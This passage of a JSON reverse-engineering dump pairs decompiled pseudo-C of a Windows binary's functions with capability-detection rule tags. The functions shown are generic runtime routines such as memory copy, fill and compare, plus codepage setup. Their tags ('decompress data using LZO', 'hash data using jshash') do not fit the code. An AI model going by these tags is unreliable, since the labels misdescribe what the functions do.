0x40b088)) {\n                case 0x40b0a0:\n                    goto code_r0x0040b0a0;\n                case 0x40b0b0:\n                    goto code_r0x0040b0b0;\n                case 0x40b0c4:\n                    goto code_r0x0040b0c4;\n                }\n                break;\n            case 0x40afe8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x0040af64;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40b088)) {\n                case 0x40b0a0:\n                    goto code_r0x0040b0a0;\n                case 0x40b0b0:\n                    goto code_r0x0040b0b0;\n                case 0x40b0c4:\n                    goto code_r0x0040b0c4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0040adfc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x40aeec\n        switch(*((arg_10h & 3) * 4 + 0x40aeec)) {\n        case 0x40af04:\ncode_r0x0040af04:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x40af10:\ncode_r0x0040af10:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40af24:\ncode_r0x0040af24:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40aefc)) {\n        case 0x40af04:\n            goto code_r0x0040af04;\n        case 0x40af10:\n            goto code_r0x0040af10;\n        case 0x40af24:\n            goto code_r0x0040af24;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40ae00)) {\n        case 0x40ae10:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0040adfc:\n    // WARNING: Could not recover jumptable at 0x0040adfc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40ae80\n                puVar1 = (**(uVar2 * 4 + 0x40ae80))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40aeec)) {\n            case 0x40af04:\n                goto code_r0x0040af04;\n            case 0x40af10:\n                goto code_r0x0040af10;\n            case 0x40af24:\n                goto code_r0x0040af24;\n            }\n            break;\n        case 0x40ae3c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0040adfc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40aeec)) {\n            case 0x40af04:\n                goto code_r0x0040af04;\n            case 0x40af10:\n                goto code_r0x0040af10;\n            case 0x40af24:\n                goto code_r0x0040af24;\n            }\n            break;\n        case 0x40ae60:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0040adfc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40aeec)) {\n            case 0x40af04:\n                goto code_r0x0040af04;\n            case 0x40af10:\n                goto code_r0x0040af10;\n            case 0x40af24:\n                goto code_r0x0040af24;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2753
    },
    "0040bce0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040bce0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0040bea4;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x40bfc8\n            switch(*((arg_10h & 3) * 4 + 0x40bfc8)) {\n            case 0x40bfe0:\ncode_r0x0040bfe0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40bff0:\ncode_r0x0040bff0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40c004:\ncode_r0x0040c004:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40bfc8\n            switch(*(arg_10h * 4 + 0x40bfc8)) {\n            case 0x40bfe0:\n                goto code_r0x0040bfe0;\n            case 0x40bff0:\n                goto code_r0x0040bff0;\n            case 0x40c004:\n                goto code_r0x0040c004;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40becc)) {\n            case 0x40bedc:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0040bea4:\n    // WARNING: Could not recover jumptable at 0x0040bea6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40bf78\n                    puVar1 = (**(uVar3 * -4 + 0x40bf78))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40bfc8)) {\n                case 0x40bfe0:\n                    goto code_r0x0040bfe0;\n                case 0x40bff0:\n                    goto code_r0x0040bff0;\n                case 0x40c004:\n                    goto code_r0x0040c004;\n                }\n                break;\n            case 0x40bf00:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0040bea4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40bfc8)) {\n                case 0x40bfe0:\n                    goto code_r0x0040bfe0;\n                case 0x40bff0:\n                    goto code_r0x0040bff0;\n                case 0x40c004:\n                    goto code_r0x0040c004;\n                }\n                break;\n            case 0x40bf28:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x0040bea4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40bfc8)) {\n                case 0x40bfe0:\n                    goto code_r0x0040bfe0;\n                case 0x40bff0:\n                    goto code_r0x0040bff0;\n                case 0x40c004:\n                    goto code_r0x0040c004;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0040bd3c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x40be2c\n        switch(*((arg_10h & 3) * 4 + 0x40be2c)) {\n        case 0x40be44:\ncode_r0x0040be44:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x40be50:\ncode_r0x0040be50:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40be64:\ncode_r0x0040be64:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40be3c)) {\n        case 0x40be44:\n            goto code_r0x0040be44;\n        case 0x40be50:\n            goto code_r0x0040be50;\n        case 0x40be64:\n            goto code_r0x0040be64;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40bd40)) {\n        case 0x40bd50:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0040bd3c:\n    // WARNING: Could not recover jumptable at 0x0040bd3c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40bdc0\n                puVar1 = (**(uVar2 * 4 + 0x40bdc0))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40be2c)) {\n            case 0x40be44:\n                goto code_r0x0040be44;\n            case 0x40be50:\n                goto code_r0x0040be50;\n            case 0x40be64:\n                goto code_r0x0040be64;\n            }\n            break;\n        case 0x40bd7c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0040bd3c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40be2c)) {\n            case 0x40be44:\n                goto code_r0x0040be44;\n            case 0x40be50:\n                goto code_r0x0040be50;\n            case 0x40be64:\n                goto code_r0x0040be64;\n            }\n            break;\n        case 0x40bda0:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0040bd3c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40be2c)) {\n            case 0x40be44:\n                goto code_r0x0040be44;\n            case 0x40be50:\n                goto code_r0x0040be50;\n            case 0x40be64:\n                goto code_r0x0040be64;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2727
    },
    "0040cf50": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040cf50(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 387
    },
    "0040da60": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.0040da60(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x0040dae0;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x0040dae0:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x0040dae0;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x0040dae0;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x0040da93;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x0040dae0;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x0040da93:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x0040dae0;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1048
    },
    "00414d07": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d07(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    uVar1 = fcn.00414cb5();\n    iVar2 = (**0x442be4)(uVar1, (-(*0x442bd4 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar2 == 0) {\n        *0x442bc4 = 0;\n    }\n    else {\n        iVar2 = fcn.0041826e(*0x442bd8, &var_7ch);\n        if ((iVar2 == 0) && (iVar2 = fcn.00414bb4(uVar1),  iVar2 != 0)) {\n            *0x442bc4 = *0x442bc4 | 4;\n            *0x442bc8 = uVar1;\n            *0x442bcc = uVar1;\n        }\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 263
    },
    "00414e0c": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414e0c(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    arg_8h_00 = fcn.00414cb5();\n    iVar1 = (**0x442be4)(arg_8h_00, (-(*0x442bd4 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x442bc4 = 0;\n        goto code_r0x00415019;\n    }\n    iVar1 = fcn.0041826e(*0x442bd8, &var_7ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x442be4)(arg_8h_00, (-(*0x442bd0 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0041826e(*0x442be0, &var_7ch);\n            if (iVar1 == 0) {\n                *0x442bc4 = *0x442bc4 | 0x304;\n                *0x442bc8 = arg_8h_00;\n                *0x442bcc = arg_8h_00;\n            }\n            else if ((*0x442bc4 & 2) == 0) {\n                if ((*0x442bdc == 0) || (iVar1 = fcn.0041840b(*0x442be0, &var_7ch, *0x442bdc),  iVar1 != 0)) {\n                    if (((*0x442bc4 & 1) == 0) && (iVar1 = fcn.00414bb4(arg_8h_00),  iVar1 != 0)) {\n                        *0x442bc4 = *0x442bc4 | 1;\n                        *0x442bcc = arg_8h_00;\n                    }\n                }\n                else {\n                    *0x442bc4 = *0x442bc4 | 2;\n                    *0x442bcc = arg_8h_00;\n                    iVar1 = fcn.0040bc50(*0x442be0);\n                    if (iVar1 == *0x442bdc) {\n                        *0x442bc8 = arg_8h_00;\n                    }\n                }\n            }\n            goto code_r0x00414f37;\n        }\ncode_r0x00414f6b:\n        *0x442bc4 = 0;\n        goto code_r0x00415019;\n    }\ncode_r0x00414f37:\n    if ((*0x442bc4 & 0x300) == 0x300) goto code_r0x00415019;\n    iVar1 = (**0x442be4)(arg_8h_00, (-(*0x442bd0 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) goto code_r0x00414f6b;\n    iVar1 = fcn.0041826e(*0x442be0, &var_7ch);\n    if (iVar1 == 0) {\n        *0x442bc4 = *0x442bc4 | 0x200;\n        if (((*0x442bd0 == 0) && (*0x442bdc != 0)) && (iVar1 = fcn.0040bc50(*0x442be0),  iVar1 == *0x442bdc)) {\n            arg_ch = 1;\n            goto code_r0x00414fe9;\n        }\n    }\n    else {\n        if (((*0x442bd0 != 0) || (*0x442bdc == 0)) ||\n           (iVar1 = fcn.0041840b(*0x442be0, &var_7ch, *0x442bdc),  iVar1 != 0)) goto code_r0x00415019;\n        arg_ch = 0;\ncode_r0x00414fe9:\n        iVar1 = fcn.00414d9b(arg_8h_00, arg_ch);\n        if (iVar1 == 0) goto code_r0x00415019;\n    }\n    *0x442bc4 = *0x442bc4 | 0x100;\n    if (*0x442bc8 == 0) {\n        *0x442bc8 = arg_8h_00;\n    }\ncode_r0x00415019:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1087
    },
    "00415026": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415026(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    arg_8h_00 = fcn.00414cb5();\n    iVar1 = (**0x442be4)(arg_8h_00, (-(*0x442bd0 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x442bc4 = 0;\n        goto code_r0x004150e4;\n    }\n    iVar1 = fcn.0041826e(*0x442be0, &var_7ch);\n    if (iVar1 == 0) {\n        if (*0x442bd0 == 0) {\n            iVar1 = 1;\n            goto code_r0x004150b8;\n        }\n    }\n    else {\n        if (((*0x442bd0 != 0) || (*0x442bdc == 0)) ||\n           (iVar1 = fcn.0041840b(*0x442be0, &var_7ch, *0x442bdc),  iVar1 != 0)) goto code_r0x004150e4;\ncode_r0x004150b8:\n        iVar1 = fcn.00414d9b(arg_8h_00, iVar1);\n        if (iVar1 == 0) goto code_r0x004150e4;\n    }\n    *0x442bc4 = *0x442bc4 | 4;\n    *0x442bc8 = arg_8h_00;\n    *0x442bcc = arg_8h_00;\ncode_r0x004150e4:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 431
    },
    "0041611c": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041611c(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x442f24;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x442f24;\n        noname_13_00 = *0x442d84;\n        fcn.004153b8(1, noname_1, 0x100, puVar9, *0x442f24, *0x442d84, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x442d84;\n        noname_14 = *0x442f24;\n        fcn.0040e63a(*0x442d84, 0x100, noname_2, 0x100, noname_4, 0x100, *0x442f24, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.0040e63a(*0x442d84, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x442f24, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x0041622e;\n                }\n                *(uVar3 + 0x442f40) = 0;\n            }\n            else {\n                *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x0041622e:\n                *(uVar3 + 0x442f40) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x00416271;\n                }\n                *(uVar3 + 0x442f40) = 0;\n            }\n            else {\n                *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x00416271:\n                *(uVar3 + 0x442f40) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1835
    },
    "004010f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004010f0(uint8_t *param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t uVar4;\n    uint unaff_ESI;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    int32_t noname_4;\n    uint noname_2;\n    uint noname_2_00;\n    uint noname_2_01;\n    uint noname_2_02;\n    uint noname_2_03;\n    uint noname_2_04;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint noname_6;\n    \n    uVar5 = 0xffffffff;\n    noname_6 = 0;\n    uVar1 = *param_1;\n    while (uVar1 != 0) {\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, unaff_EDI, unaff_EBP, unaff_ESI, unaff_EBX, noname_6, unaff_retaddr, \n                              param_1, param_2, param_3, param_4, param_5);\n        uVar16 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 